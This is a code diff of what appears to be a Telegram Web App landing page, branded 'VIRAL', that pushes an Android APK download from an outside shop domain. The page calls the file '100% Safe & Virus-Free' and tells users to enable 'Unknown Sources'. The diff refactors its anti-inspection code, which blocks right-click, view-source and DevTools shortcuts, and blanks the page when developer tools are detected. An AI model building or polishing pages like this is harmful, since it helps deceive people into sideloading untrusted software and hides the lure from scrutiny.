@@ -68,7 +68,7 @@
 
         @keyframes fadeUp {
             from { opacity: 0; transform: translateY(24px); }
-            to { opacity: 1; transform: translateY(0); }
+            to   { opacity: 1; transform: translateY(0); }
         }
 
         .brand {
@@ -206,9 +206,9 @@
             box-shadow: 0 4px 20px rgba(229,9,20,0.3);
             font-family: inherit;
         }
-        .btn-download:hover { opacity: 0.9; }
+        .btn-download:hover  { opacity: 0.9; }
         .btn-download:active { transform: scale(0.97); }
-        .btn-download svg { width: 18px; height: 18px; }
+        .btn-download svg    { width: 18px; height: 18px; }
 
         .features {
             display: flex;
@@ -231,7 +231,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 14px;
+            font-size: 16px;
         }
         .feature-label {
             font-size: 9px;
@@ -287,6 +287,7 @@
     <div class="glow-bg-2"></div>
 
     <div class="card">
+
         <div class="brand">
             <div class="brand-icon">V</div>
             <div class="brand-text">VIRAL</div>
@@ -319,25 +320,26 @@
 
         <div class="features">
             <div class="feature">
-                <div class="feature-icon">&#128274;</div>
+                <!-- Lock emoji via HTML hex entity — never breaks on any encoding -->
+                <div class="feature-icon">&#x1F512;</div>
                 <div class="feature-label">SECURE</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">&#9889;</div>
+                <div class="feature-icon">&#x26A1;</div>
                 <div class="feature-label">FAST</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">&#128683;</div>
+                <div class="feature-icon">&#x1F6AB;</div>
                 <div class="feature-label">NO VPN</div>
             </div>
             <div class="feature">
-                <div class="feature-icon">&#127379;</div>
+                <div class="feature-icon">&#x1F193;</div>
                 <div class="feature-label">FREE</div>
             </div>
         </div>
 
         <div class="notice">
-            100% Safe &amp; Virus-Free. Enable <a href="#">"Unknown Sources"</a> in settings.
+            100% Safe &amp; Virus-Free. Enable <a href="#">&ldquo;Unknown Sources&rdquo;</a> in settings.
         </div>
     </div>
 
@@ -357,83 +359,69 @@
         //  PROTECTION LAYER
         // ============================================================
 
-        // 1. Disable right-click everywhere
+        // 1. Disable right-click
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             return false;
         }, true);
 
-        // 2. Disable long-press context menu on mobile (touchstart hold)
-        document.addEventListener('touchstart', function(e) {
-            // track start time
-            e._touchStartTime = Date.now();
-        }, { passive: true });
-
-        document.addEventListener('touchend', function(e) {
-            // nothing needed, just prevent text selection popup
-        }, { passive: true });
-
-        // Prevent long-press callout on all elements
-        document.addEventListener('touchstart', function(e) {
-            e.target.style.webkitTouchCallout = 'none';
-        }, { passive: true });
-
-        // Kill long-press context via touchforcechange / contextmenu on touch
+        // 2. Disable long-press / touch callout
         window.addEventListener('contextmenu', function(e) {
             e.preventDefault();
             e.stopPropagation();
             return false;
         }, true);
 
-        // 3. Block all keyboard dev-tool shortcuts
+        document.addEventListener('DOMContentLoaded', function() {
+            var all = document.querySelectorAll('*');
+            for (var i = 0; i < all.length; i++) {
+                all[i].style.webkitTouchCallout = 'none';
+                all[i].style.webkitUserSelect   = 'none';
+            }
+        });
+
+        // 3. Block DevTools keyboard shortcuts
         document.addEventListener('keydown', function(e) {
-            // F12
             if (e.keyCode === 123) { e.preventDefault(); return false; }
-            // Ctrl+Shift+I / J / C  (DevTools)
-            if (e.ctrlKey && e.shiftKey && [73, 74, 67].includes(e.keyCode)) { e.preventDefault(); return false; }
-            // Ctrl+U  (View Source)
+            if (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) { e.preventDefault(); return false; }
             if (e.ctrlKey && e.keyCode === 85) { e.preventDefault(); return false; }
-            // Ctrl+S  (Save Page)
             if (e.ctrlKey && e.keyCode === 83) { e.preventDefault(); return false; }
-            // Ctrl+A  (Select All)
             if (e.ctrlKey && e.keyCode === 65) { e.preventDefault(); return false; }
-            // Ctrl+P  (Print)
             if (e.ctrlKey && e.keyCode === 80) { e.preventDefault(); return false; }
         }, true);
 
-        // 4. Detect DevTools open (desktop) — redirect or blank when opened
-        (function devToolsDetect() {
+        // 4. DevTools open detection
+        (function() {
             var threshold = 160;
-            function check() {
+            setInterval(function() {
                 if (
-                    window.outerWidth - window.innerWidth > threshold ||
+                    window.outerWidth  - window.innerWidth  > threshold ||
                     window.outerHeight - window.innerHeight > threshold
                 ) {
                     document.body.innerHTML = '';
                     window.location.replace('about:blank');
                 }
-            }
-            setInterval(check, 1000);
+            }, 1000);
         })();
 
-        // 5. Disable text selection via CSS (JS backup)
+        // 5. Disable selection & drag
         document.onselectstart = function() { return false; };
-        document.ondragstart  = function() { return false; };
+        document.ondragstart   = function() { return false; };
 
         // ============================================================
         //  APP LOGIC
         // ============================================================
 
-        const tg = window.Telegram.WebApp;
+        var tg = window.Telegram.WebApp;
         tg.expand();
 
-        const cacheBuster = new Date().getTime();
-        const downloadUrl = "https://tgreward.shop/downloads/viralvideos.apk?v=" + cacheBuster;
+        var cacheBuster = new Date().getTime();
+        var downloadUrl = "https://tgreward.shop/downloads/viralvideos.apk?v=" + cacheBuster;
 
         function triggerDownload() {
-            const btn = document.querySelector('.btn-download');
+            var btn = document.querySelector('.btn-download');
             btn.style.transform = 'scale(0.96)';
-            setTimeout(() => btn.style.transform = 'scale(1)', 150);
+            setTimeout(function() { btn.style.transform = 'scale(1)'; }, 150);
 
             if (tg.initDataUnsafe && Object.keys(tg.initDataUnsafe).length > 0) {
                 tg.openLink(downloadUrl);
@@ -442,13 +430,12 @@
             }
         }
 
-        // COUNTDOWN TIMER
-        document.addEventListener('DOMContentLoaded', () => {
-            let timeLeft = 5;
-            const countdownEl = document.getElementById('countdown');
-            const timerBox    = document.getElementById('timerBox');
+        document.addEventListener('DOMContentLoaded', function() {
+            var timeLeft    = 5;
+            var countdownEl = document.getElementById('countdown');
+            var timerBox    = document.getElementById('timerBox');
 
-            const timer = setInterval(() => {
+            var timer = setInterval(function() {
                 timeLeft--;
                 if (countdownEl) countdownEl.textContent = timeLeft;
 
